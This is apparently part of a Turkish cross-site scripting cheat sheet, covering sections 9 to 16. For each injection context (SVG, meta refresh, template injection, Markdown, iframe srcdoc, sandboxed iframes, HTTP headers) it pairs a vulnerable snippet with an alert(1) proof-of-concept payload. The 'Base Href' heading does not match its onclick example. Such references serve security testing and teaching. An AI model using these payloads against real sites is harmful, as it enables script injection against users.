<h1>CONTEXTS</h1>
<br>

<h2>🔹 9. SVG / XML Context</h2>
<h4>SVG veya XML içeriğinde çalıştırma.</h4><br>

📌 Örnek:  
`<svg><circle onload="alert(1)"/></svg>`  
<br>
🎯 Exploit:  
```html
<svg/onload=alert(1)>
```
<br>



<h2>🔹 10. Meta Tag Context</h2>
<h4>HTML içindeki `meta` etiketiyle manipulasyon.</h4><br>

📌 Örnek:  
`<meta http-equiv="refresh" content="0;url=PAYLOAD">`  
<br>
🎯 Exploit:  
```html
javascript:alert(1)"
```
<br>



<h2>🔹 11. Base Href Context</h2>
<h4>Eğer base href="..." elementi kontrol ediliyorsa.</h4><br>

📌 Örnek:  
`<button onclick="PAYLOAD">Click me</button>`  
<br>
🎯 Exploit:  
```html
" onclick=alert(1) x="
```  
```js
alert(1)
``` 
<br>


<h2>🔹 12. Template Injection Context</h2>
<h4>Client-side templating sistemlerinde: Mustache, Handlebars, AngularJS, VueJS.</h4><br>

📌 Örnek:  
```html
<script type="text/template">
  Hello {{user}}
</script>
```
<br>

🎯 Exploit:  
```js
{{constructor.constructor("alert(1)")()}}
```
<br>



<h2>🔹 13. Markdown / BBCode Context</h2>
<h4>Input markdown olarak parse edilip HTML'ye dönüşür.</h4><br>

📌 Örnek:  
`[click](javascript:alert(1))`  
<br>
🎯 Exploit:  
```html
![img](javascript:alert(1))
```
<br>



<h2>🔹 14. Iframe Srcdoc Context</h2>
<h4>HTML içeriği iframe içine srcdoc olarak yazılır.</h4><br>

📌 Örnek:  
```document.body.innerHTML = `<iframe srcdoc="${userInput}">`;```  
veya  
`element.innerHTML = location.hash;`
<br>  
🎯 Exploit:  
```html
#<iframe srcdoc="<script>alert(1)</script>" sandbox="allow-scripts">
```
<br>



<h2>🔹 15. Sandboxed Context (Controlled via CSP / Sandbox attr)</h2>
<h4>iframe[sandbox], CSP gibi güvenlik kontrollerinin yanlış yapılandırılması sonucu ortaya çıkar.</h4><br>

📌 Örnek:  
`<iframe sandbox="allow-scripts" srcdoc="PAYLOAD"></iframe>`  
<br>
🎯 Exploit:  
```html
<iframe sandbox="allow-scripts" srcdoc="<script>alert(1)</script>"></iframe>
```
<br>



<h2>🔹 16. HTTP Header Context</h2>
<h4>Bazı XSS'ler response header içeriğiyle tetiklenir.</h4><br>

📌 Örnek:  
`Location: "PAYLOAD"`
<br>  
🎯 Exploit:  
```html
javascript:alert(1)
```
Ayrıca kontrol edilmesi gerekenler:  
`Refresh:` `Referer:` `Content-Security-Policy:` injection olabilir.
